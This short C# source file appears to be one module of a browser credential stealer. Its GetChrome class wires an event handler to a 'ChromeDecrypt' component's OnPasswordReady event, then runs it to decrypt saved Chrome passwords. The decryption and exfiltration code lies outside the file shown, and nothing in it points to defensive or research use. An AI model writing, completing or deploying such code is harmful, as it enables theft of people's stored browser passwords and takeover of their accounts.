namespace PS03
{
    public class GetChrome
    {
        public void Execute()
        {
            var ev = new Eventhandlers();
            ChromeDecrypt.CDC.OnPasswordReady += ev.HandleChromeDataReady;
            ChromeDecrypt.CDC.Execute();
        }
    }
}